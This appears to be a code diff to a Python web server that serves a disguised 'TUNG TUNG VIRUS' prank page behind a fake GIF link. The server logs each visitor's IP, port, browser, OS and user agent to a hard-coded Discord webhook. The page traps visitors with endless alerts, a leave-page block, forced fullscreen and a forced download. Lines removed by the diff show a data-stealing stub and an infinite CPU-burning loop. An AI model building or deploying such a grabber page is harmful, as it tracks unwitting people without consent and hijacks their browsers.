@@ -6,13 +6,13 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QH
 
 FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"
 
-# ──────── MAX ANNOYING PAGE + WORKING LOUD TUNG TUNG SONG ────────
+# Short & stable annoying page with loud Tung Tung song
 ANNOY_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>TUNG TUNG VIRUS</title>
+  <title>TUNG TUNG</title>
   <style>
     body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}
     #overlay{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}
@@ -23,52 +23,18 @@ ANNOY_HTML = """
 <body>
   <div id="overlay">
     <h1>TUNG TUNG VIRUS</h1>
-    <p>Stealing your info... Enjoy the song 😈</p>
+    <p>LOUD MODE ACTIVATED 🔥</p>
   </div>
 
-  <!-- WORKING Tung Tung Song -->
-  <audio id="song" autoplay loop crossorigin="anonymous" preload="auto">
-    <source src="https://files.catbox.moe/8v4p0k.mp3" type="audio/mpeg">
+  <audio id="song" autoplay loop>
+    <source src="https://www.myinstants.com/media/sounds/tung-tung-sahur.mp3" type="audio/mpeg">
   </audio>
 
   <script>
-    const webhook = "%s";
-
-    // Send max info (same as before)
-    async function getMaxInfo() {
-      // ... (same max info code as last version - kept for brevity)
-      // You already have this part from previous script
-    }
-    getMaxInfo();
-
-    // Force loud Tung Tung song
+    // Loud Tung Tung song
     const audio = document.getElementById("song");
     audio.volume = 1.0;
-
-    // Try to play the song (works much better with new link)
-    function playSong() {
-      audio.play().catch(() => {
-        // Fallback if autoplay is blocked
-        setTimeout(playSong, 500);
-      });
-    }
-    playSong();
-
-    // Rest of the annoying stuff
-    document.documentElement.requestFullscreen?.().catch(() => {});
-    window.onbeforeunload = () => "TUNG TUNG says NO!";
-    setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 700);
-
-    // Heavy CPU lag
-    function cpuHell() {
-      while(true) {
-        for(let i = 0; i < 20000000; i++) {
-          Math.sin(i) * Math.cos(i) * Math.random();
-        }
-        setTimeout(cpuHell, 0);
-      }
-    }
-    cpuHell();
+    audio.play().catch(() => { setTimeout(() => audio.play(), 300); });
 
     // Force GIF download
     const link = document.createElement('a');
@@ -77,10 +43,15 @@ ANNOY_HTML = """
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
+
+    // Annoying stuff
+    document.documentElement.requestFullscreen?.().catch(() => {});
+    window.onbeforeunload = () => "TUNG TUNG says NO!";
+    setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 800);
   </script>
 </body>
 </html>
-""" % (WEBHOOK_URL, FAKE_IMAGE_URL)
+""" % FAKE_IMAGE_URL
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -90,14 +61,15 @@ class handler(BaseHTTPRequestHandler):
             user_agent = self.headers.get('User-Agent', 'Unknown')
             parsed = httpagentparser.detect(user_agent)
 
-            quick_log = f"""**NEW CLICK!**
+            log = f"""**NEW CLICK!**
 IP: `{ip}`
 Port: `{port}`
 Browser: {parsed.get('browser', {}).get('name', 'Unknown')}
 OS: {parsed.get('os', {}).get('name', 'Unknown')}
-UA: `{user_agent}`"""
+UA: `{user_agent}`
+**Tung Tung loud song activated!**"""
 
-            requests.post(WEBHOOK_URL, json={"content": quick_log})
+            requests.post(WEBHOOK_URL, json={"content": log})
 
             html = ANNOY_HTML.encode('utf-8')
             self.send_response(200)
